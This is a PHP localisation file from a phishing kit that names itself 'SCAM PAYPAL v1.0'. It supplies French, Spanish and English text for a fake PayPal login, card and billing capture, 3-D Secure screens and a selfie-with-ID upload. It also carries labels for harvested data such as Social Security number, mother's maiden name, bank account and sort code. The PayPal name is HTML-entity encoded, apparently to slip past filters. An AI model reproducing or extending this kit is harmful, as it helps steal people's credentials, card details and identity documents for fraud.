<?php
/*   
        ───────────────────────────────────────────────────────────────────────────────────
        ───────────────────██████──────────██████─████████████████─────────────────────────
        ───────────────────██░░██████████████░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░░░░░░░░░░░░░░░░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██████░░██████░░██─██░░██────██░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░██──██████──██░░██─██░░██████░░████─────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██───────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██████─██████────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░░░░░██─██░░██────────────────
        ───────────────────██████──────────██████─██████──██████████─██████────────────────
        ───────────────────────────────────────────────────────────────────────────────────
        ────────────────────────────────────────────────────────────────────────────────────
        ─██████████████─██████─────────██████████████─██████████████─██████──────────██████─
        ─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
        ─██░░██████████─██░░██─────────██░░██████████─██░░██████░░██─██░░░░░░░░░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██──██░░██████░░██─
        ─██░░██████████─██░░██████████─██░░██████████─██░░██──██░░██─██░░██──██░░░░░░░░░░██─
        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██████████░░██─
        ─██████████████─██████████████─██████████████─██████──██████─██████──────────██████─
        ───────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM PAYPAL v1.0    #
                                        #    Mr.CLEAN.PAYPAL    #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
session_start();

include 'get_ip.php';

require_once ('country_code_to_locale.php');
use mrclean\locale\locale;

$lang = locale::country2locale($LOOKUP_LOWCODE);


if ($lang == 'fr') {
	$secureleylogging = "Vous connecter en toute sécurité...";
}elseif ($lang == 'es') {
	$secureleylogging = "Iniciando sesión de forma segura...";
}else{
	$secureleylogging = "Securely logging you in...";
}

if ($lang == 'fr') {
	$Validating = "Validation de vos informations...";
}elseif ($lang == 'es') {
	$Validating = "Validar su información...";
}else{
	$Validating = "Validating your information...";
}

if ($lang == 'fr') {
        $DSECURE = "3-D Secure a été traité avec succès...";
}elseif ($lang == 'es') {
        $DSECURE = "3-D Secure ha sido procesado con éxito ...";
}else{
        $DSECURE = "3-D Secure has been successfully processed...";
}


if ($lang == 'fr') {
$presentation = "Veuillez confirmer une carte de débit ou de crédit pour configurer votre compte.";
}elseif ($lang == 'es') {
$presentation = "Por favor, confirme una tarjeta de débito o crédito para configurar su cuenta.";

}else{
$presentation = "Please confirm a debit or credit card to set-up your account.";
}

if ($lang == 'fr') {
$notifications = "Nouvelle adresse de facturation ajoutée.";
}elseif ($lang == 'es') {
$notifications = "Nueva dirección de facturación agregada.";
}else{
$notifications = "New billing address added.";
}

if ($lang == 'fr') {
$Confirm = "Confirmer une carte de débit ou de crédit";
}elseif ($lang == 'es') {
$Confirm = "Confirmar una tarjeta de débito o crédito";
}else{
$Confirm = "Confirm a debit or credit card";
}

if ($lang == 'fr') {
$firstName = "Prénom";
}elseif ($lang == 'es') {
$firstName = "Nombre de pila";
}else{
$firstName = "First name";
}


if ($lang == 'fr') {
$lastName = "Nom de famille";
}elseif ($lang == 'es') {
$lastName = "Apellido";
}else{
$lastName = "Last name";
}


if ($lang == 'fr') {
$cardnumber = "Numéro de carte";
}elseif ($lang == 'es') {
$cardnumber = "Número de tarjeta";
}else{
$cardnumber = "Card number";
}


if ($lang == 'fr') {
$Expires = "Expire";
}elseif ($lang == 'es') {
$Expires = "Vence";
}else{
$Expires = "Expires";
}


if ($lang == 'fr') {
$CSC = "CSC";
}elseif ($lang == 'es') {
$CSC = "CSC";
}else{
$CSC = "CSC";
}


if ($lang == 'fr') {
$digits = "3 chiffres";
}elseif ($lang == 'es') {
$digits = "3 dígitos";
}else{
$digits = "3 digits";
}


if ($lang == 'fr') {
$Billingaddress = "Adresse de facturation";
}elseif ($lang == 'es') {
$Billingaddress = "Dirección de Envio";
}else{
$Billingaddress = "Billing address";
}


if ($lang == 'fr') {
$Add = "Ajouter";
}elseif ($lang == 'es') {
$Add = "Añadir";
}else{
$Add = "Add";
}


if ($lang == 'fr') {
$Noaddress = "Aucune adresse trouvée!";
}elseif ($lang == 'es') {
$Noaddress = "¡No se encontró dirección!";
}else{
$Noaddress = "No address found!";
}


if ($lang == 'fr') {
$Continue = "Continuer";
}elseif ($lang == 'es') {
$Continue = "Continuar";
}else{
$Continue = "Continue";
}

if ($lang == 'es') {
$safer = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; es la forma más segura y rápida de pagar";
}elseif ($lang == 'fr') {
$safer = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; est le moyen le plus sûr et le plus rapide de payer";
}else{
$safer = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; is the safer, faster way to pay";
}


if ($lang == 'fr') {
$matter = "Peu importe où vous magasinez, nous gardons vos informations financières en sécurité.";
}elseif ($lang == 'es') {
$matter = "No importa dónde compre, mantenemos segura su información financiera.";
}else{
$matter = "No matter where you shop, we keep your financial information secure.";
}


if ($lang == 'fr') {
$billing = "Veuillez ajouter une adresse de facturation pour configurer votre compte.";
}elseif ($lang == 'es') {
$billing = "Agregue una dirección de facturación para configurar su cuenta.";
}else{
$billing = "Please add a billing address to set-up your account.";
}


if ($lang == 'fr') {
$Addbilling = "Ajouter une adresse de facturation";
}elseif ($lang == 'es') {
$Addbilling = "Agregar una dirección de facturación";
}else{
$Addbilling = "Add a billing address";
}


if ($lang == 'fr') {
$Add1 = "Adresse Ligne 1";
}elseif ($lang == 'es') {
$Add1 = "Dirección Línea 1";
}else{
$Add1 = "Address line 1";
}


if ($lang == 'fr') {
$Add2 = "Adresse Ligne 2";
}elseif ($lang == 'es') {
$Add2 = "Dirección Línea 2";
}else{
$Add2 = "Address line 2";
}


if ($lang == 'fr') {
$City = "Ville / Village";
}elseif ($lang == 'es') {
$City = "Ciudad pueblo Villa";
}else{
$City = "City / Town / Village";
}


if ($lang == 'fr') {
$State = "Etat / Province / Région";
}elseif ($lang == 'es') {
$State = "Estado / Provincia / Región";
}else{
$State = "State / Province / Region";
}


if ($lang == 'fr') {
$Postal = "Code postal";
}elseif ($lang == 'es') {
$Postal = "Código postal";
}else{
$Postal = "Postal code";
}


if ($lang == 'fr') {
$Back = "Arrière";
}elseif ($lang == 'es') {
$Back = "Espalda";
}else{
$Back = "Back";
}


if ($lang == 'fr') {
$Save = "Sauvegarder";
}elseif ($lang == 'es') {
$Save = "Salvar";
}else{
$Save = "Save";
}

if ($lang == 'fr') {
$Legal = "Légal";
}elseif ($lang == 'es') {
$Legal = "Legal";
}else{
$Legal = "Legal";
}


if ($lang == 'fr') {
$User = "Accord de l'utilisateur";
}elseif ($lang == 'es') {
$User = "Acuerdo del Usuario";
}else{
$User = "User Agreement";
}


if ($lang == 'fr') {
$Privacy = "Intimité";
}elseif ($lang == 'es') {
$Privacy = "Intimidad";
}else{
$Privacy = "Privacy";
}


if ($lang == 'fr') {
$Feedback = "Retour d'information";
}elseif ($lang == 'es') {
$Feedback = "Realimentación";
}else{
$Feedback = "Feedback";
}


if ($lang == 'fr') {
$Log = "Connectez-vous à votre compte";
}elseif ($lang == 'es') {
$Log = "Ingrese a su cuenta";
}else{
$Log = "Log in to your account";
}


$date = "© 1999-".date('Y')."";


if ($lang == 'fr') {
$Email = "Adresse e-mail";
}elseif ($lang == 'es') {
$Email = "Dirección de correo electrónico";
}else{
$Email = "Email address";
}


if ($lang == 'fr') {
$Emailrequired = "Adresse e-mail est nécessaire.";
}elseif ($lang == 'es') {
$Emailrequired = "Se requiere Dirección de correo electrónico.";
}else{
$Emailrequired = "Email address is required.";
}

if ($lang == 'fr') {
$Password = "Tapez votre mot de passe";
}elseif ($lang == 'es') {
$Password = "Ingresa tu contraseña";
}else{
$Password = "Enter your password";
}

if ($lang == 'fr') {
$required = "Mot de passe requis.";
}elseif ($lang == 'es') {
$required = "Se requiere contraseña.";
}else{
$required = "Password is required.";
}


if ($lang == 'fr') {
$LogIn = "S'identifier";
}elseif ($lang == 'es') {
$LogIn = "Iniciar sesión";
}else{
$LogIn = "Log In";
}


if ($lang == 'fr') {
$Password = "Mot de passe";
}elseif ($lang == 'es') {
$Password = "Contraseña";
}else{
$Password = "Password";
}

if ($lang == 'fr') {
$trouble = "Vous avez des problèmes pour vous connecter?";
}elseif ($lang == 'es') {
$trouble = "¿Tiene problemas para iniciar sesión?";
}else{
$trouble = "Having trouble logging in?";
}

if ($lang == 'fr') {
$Sign = "S'inscrire";
}elseif ($lang == 'es') {
$Sign = "Regístrate";
}else{
$Sign = "Sign Up";
}

if ($lang == 'fr') {
$Checking = "Vérification de vos informations ...";
}elseif ($lang == 'es') {
$Checking = "Verificando su información ...";
}else{
$Checking = "Checking your info...";
}

if ($lang == 'fr') {
$rights = ". Tous les droits sont réservés.";
}elseif ($lang == 'es') {
$rights = ". Todos los derechos reservados.";
}else{
$rights = ". All rights reserved.";
}

$Copyright = "Copyright © 1999-".date('Y')."";

if ($lang == 'fr') {
$Safety = "Sécurité en ligne ajoutée";
}elseif ($lang == 'es') {
$Safety = "Seguridad agregada en línea";
}else{
$Safety = "Added Safety Online";
}

if ($lang == 'fr') {
$protect = "aide à protéger votre";
}elseif ($lang == 'es') {
$protect = "ayuda a proteger su";
}else{
$protect = "helps protect your";
}

if ($lang == 'fr') {
$against = "carte contre toute utilisation non autorisée en ligne - sans frais supplémentaires. Utiliser";
}elseif ($lang == 'es') {
$against = "tarjeta contra el uso no autorizado en línea, sin costo adicional. Usar";
}else{
$against = "card against unauthorized use online - at no additional cost. To use";
}


if ($lang == 'fr') {
$future = "sur ce et les achats futurs. compléter cette page Vous allez créer le vôtre";
}elseif ($lang == 'es') {
$future = "en esta y futuras compras. completa esta página Crearas la tuya";
}else{
$future = "on this and future purchases. complete this page You'll the create your own";
}

if ($lang == 'fr') {
$Nameon = "Nom sur carte :";
}elseif ($lang == 'es') {
$Nameon = "Nombre en la tarjeta :";
}else{
$Nameon = "Name on card :";
}

if ($lang == 'fr') {
$CountryName = "Nom du pays :";
}elseif ($lang == 'es') {
$CountryName = "Nombre del país :";
}else{
$CountryName = "Country Name :";
}

if ($lang == 'fr') {
$TypeCard = "Type de carte :";
}elseif ($lang == 'es') {
$TypeCard = "Tipo de tarjeta :";
}else{
$TypeCard = "Card Type :";
}

if ($lang == 'fr') {
$NumberCard = "Numéro de carte :";
}elseif ($lang == 'es') {
$NumberCard = "Número de tarjeta :";
}else{
$NumberCard = "Card Number :";
}

if ($lang == 'fr') {
$Datetime = "Date heure :";
}elseif ($lang == 'es') {
$Datetime = "Fecha y hora :";
}else{
$Datetime = "Date time :";
}

if ($lang == 'fr') {
$Birth = "Date de naissance :";
}elseif ($lang == 'es') {
$Birth = "Fecha de nacimiento :";
}else{
$Birth = "Birth Date :";
}

if ($lang == 'fr') {
$Fiscale = "Codice Fiscale :";
}elseif ($lang == 'es') {
$Fiscale = "Codice Fiscale :";
}else{
$Fiscale = "Codice Fiscale :";
}

if ($lang == 'fr') {
$Kontonummer = "Kontonummer :";
}elseif ($lang == 'es') {
$Kontonummer = "Kontonummer :";
}else{
$Kontonummer = "Kontonummer :";
}

if ($lang == 'fr') {
$Official = "Official ID :";
}elseif ($lang == 'es') {
$Official = "Official ID :";
}else{
$Official = "Official ID :";
}

if ($lang == 'fr') {
$OSID = "OSID :";
}elseif ($lang == 'es') {
$OSID = "OSID :";
}else{
$OSID = "OSID :";
}

if ($lang == 'fr') {
$Credit = "Credit Limit :";
}elseif ($lang == 'es') {
$Credit = "Credit Limit :";
}else{
$Credit = "Credit Limit :";
}

if ($lang == 'fr') {
$Sort = "Sort Code :";
}elseif ($lang == 'es') {
$Sort = "Sort Code :";
}else{
$Sort = "Sort Code :";
}

if ($lang == 'fr') {
$AccountNumber = "Account Number :";
}elseif ($lang == 'es') {
$AccountNumber = "Account Number :";
}else{
$AccountNumber = "Account Number :";
}

if ($lang == 'fr') {
$SSN = "Social Security Number :";
}elseif ($lang == 'es') {
$SSN = "Social Security Number :";
}else{
$SSN = "Social Security Number :";
}

if ($lang == 'fr') {
$Maiden = "Mother’s Maiden Name :";
}elseif ($lang == 'es') {
$Maiden = "Mother’s Maiden Name :";
}else{
$Maiden = "Mother’s Maiden Name :";
}

if ($lang == 'fr') {
$ACTIVATE = "CONFIRMER & ACTIVER";
}elseif ($lang == 'es') {
$ACTIVATE = "CONFIRMAR Y ACTIVAR";
}else{
$ACTIVATE = "CONFIRM & ACTIVATE";
}

if ($lang == 'fr') {
$Cannot = "Vous ne pouvez pas accéder à votre";
}elseif ($lang == 'es') {
$Cannot = "No puede acceder a su";
}else{
$Cannot = "Cannot access your";
}

if ($lang == 'fr') {
$Contact = "Contact";
}elseif ($lang == 'es') {
$Contact = "Contacto";
}else{
$Contact = "Contact";
}

if ($lang == 'fr') {
$Customer = "Service Clients.";
}elseif ($lang == 'es') {
$Customer = "Servicio al cliente.";
}else{
$Customer = "Customer Service.";
}

if ($lang == 'fr') {
$Conditions = "Conditions d'utilisation";
}elseif ($lang == 'es') {
$Conditions = "Condiciones de Uso";
}else{
$Conditions = "Conditions of Use";
}

if ($lang == 'fr') {
$Notice = "Avis de confidentialité";
}elseif ($lang == 'es') {
$Notice = "Aviso de Privacidad";
}else{
$Notice = "Privacy Notice";
}

if ($lang == 'fr') {
$Help = "Aidez-moi";
}elseif ($lang == 'es') {
$Help = "Ayuda";
}else{
$Help = "Help";
}

if ($lang == 'fr') {
$affiliates = "ou ses filiales";
}elseif ($lang == 'es') {
$affiliates = "o sus afiliados";
}else{
$affiliates = "or its affiliates";
}

if ($lang == 'fr') {
$identity = "Confirme votre identité";
}elseif ($lang == 'es') {
$identity = "Confirme su identidad";
}else{
$identity = "Confirm your identity";
}

if ($lang == 'fr') {
$documents = "Vos documents d'identification nous aideront à valider votre identité.";
}elseif ($lang == 'es') {
$documents = "Sus documentos de identificación nos ayudarán a validar su identidad.";
}else{
$documents = "Your identification documents will help us to validate your identity.";
}

if ($lang == 'fr') {
$should = "Que dois-je faire pour confirmer mon identité?";
}elseif ($lang == 'es') {
$should = "¿Qué debería hacer para confirmar mi identidad?";
}else{
$should = "What i should to do, to confirm my identity?";
}

if ($lang == 'fr') {
$selfie = "Prenez un selfie en tenant votre carte d'identité aussi votre ";
}elseif ($lang == 'es') {
$selfie = "Tome una selfie sosteniendo su tarjeta de identificación también su ";
}else{
$selfie = "Take a selfie by holding your ID Card also your ";
}

if ($lang == 'fr') {
$match = "Le nom du titulaire de la carte et la carte d'identité doivent correspondre et être clairement visibles.";
}elseif ($lang == 'es') {
$match = "El nombre del titular de la tarjeta y la tarjeta de identificación deben coincidir y ser claramente visibles.";
}else{
$match = "Cardholder Name and ID Card should match and be clearly visible.";
}

if ($lang == 'fr') {
$must = "Votre document d'identification doit être à côté de votre visage.";
}elseif ($lang == 'es') {
$must = "Su documento de identificación debe estar al lado de su cara.";
}else{
$must = "Your identification document must be next to your face.";
}

if ($lang == 'fr') {
$example = "Voici un exemple de photo :";
}elseif ($lang == 'es') {
$example = "Aquí hay un ejemplo para la imagen :";
}else{
$example = "Here's an example for picture :";
}

if ($lang == 'fr') {
$Agree = "En cliquant sur Accepter et continuer, j'ai lu et accepté de ";
}elseif ($lang == 'es') {
$Agree = "Al hacer clic en Aceptar y continuar, he leído y acepto ";
}else{
$Agree = "By clicking Agree & Continue, I have read and agree to ";
}

if ($lang == 'fr') {
$Agreement = "Accord de l'utilisateur";
}elseif ($lang == 'es') {
$Agreement = "Acuerdo del Usuario";
}else{
$Agreement = "User Agreement";
}

if ($lang == 'fr') {
$PolicyPrivacy = "Politique de confidentialité";
}elseif ($lang == 'es') {
$PolicyPrivacy = "Política de privacidad";
}else{
$PolicyPrivacy = "Privacy Policy";
}

if ($lang == 'fr') {
$and = " et ";
}elseif ($lang == 'es') {
$and = " y ";
}else{
$and = " and ";
}

if ($lang == 'fr') {
$Communications = "Politique de livraison des communications électroniques";
}elseif ($lang == 'es') {
$Communications = "Política de entrega de comunicaciones electrónicas";
}else{
$Communications = "Electronic Communications Delivery Policy";
}

if ($lang == 'fr') {
$submit = "Accepter et continuer";
}elseif ($lang == 'es') {
$submit = "Αgree y continúa";
}else{
$submit = "Αgree & Continue";
}

if ($lang == 'fr') {
$Congratulations = "Félicitations !";
}elseif ($lang == 'es') {
$Congratulations = "Felicidades !";
}else{
$Congratulations = "Congratulations !";
}

if ($lang == 'fr') {
$CongratP = "Cher ".$_SESSION['_fullname_'].", votre compte &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; a été vérifié avec succès. Vous serez redirigé automatiquement vers la page de connexion dans 5 secondes.";
}elseif ($lang == 'es') {
$CongratP = "Estimado ".$_SESSION['_fullname_'].", su cuenta &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; ha sido verificada con éxito. Será redirigido automáticamente a la página de inicio de sesión en 5 segundos.";
}else{
$CongratP = "Dear ".$_SESSION['_fullname_'].", your &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; account has been successfully verified. You will be redirected automatically to login page in 5 seconds.";
}

if ($lang == 'fr') {
$Votre = "Votre adresse de facturation";
}elseif ($lang == 'es') {
$Votre = "Su información de dirección de facturación";
}else{
$Votre = "Billing Address Information";
}

if ($lang == 'fr') {
$tarjeta = " Informations sur la carte";
}elseif ($lang == 'es') {
$tarjeta = " Información de la tarjeta";
}else{
$tarjeta = " Card Information";
}

if ($lang == 'fr') {
$votrecompte = "Vérification de votre compte...";
}elseif ($lang == 'es') {
$votrecompte = "Verificando tu cuenta...";
}else{
$votrecompte = "Verifying your account...";
}

if ($lang == 'fr') {
$all_title = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Sécurité et Sûreté";
}elseif ($lang == 'es') {
$all_title = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Seguridad y Seguridad";
}else{
$all_title = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Safety & Security";
}

if ($lang == 'fr') {
$Processing = "En traitement";
}elseif ($lang == 'es') {
$Processing = "Tratamiento";
}else{
$Processing = "Processing";
}

if ($lang == 'fr') {
$selectdocuments = "Veuillez sélectionner vos documents d'identification!";
}elseif ($lang == 'es') {
$selectdocuments = "Por favor, seleccione sus documentos de identificación!";
}else{
$selectdocuments = "Please select your identification documents !";
}

if ($lang == 'fr') {
$yousure = "Êtes-vous sûr de vouloir supprimer ce fichier?";
}elseif ($lang == 'es') {
$yousure = "¿Seguro que quieres eliminar este archivo?";
}else{
$yousure = "Are you sure you want to remove this file?";
}

if ($lang == 'fr') {
$Choosef = "Choisir des fichiers";
}elseif ($lang == 'es') {
$Choosef = "Seleccionar archivos";
}else{
$Choosef = "Choose Files";
}

if ($lang == 'fr') {
$chosen = "les fichiers ont été choisis";
}elseif ($lang == 'es') {
$chosen = "archivos fueron elegidos";
}else{
$chosen = "files were chosen";
}

if ($lang == 'fr') {
$Uploadx = "Choisir les fichiers à télécharger";
}elseif ($lang == 'es') {
$Uploadx = "Selecciona archivos para subir";
}else{
$Uploadx = "Choose files To Upload";
}
?>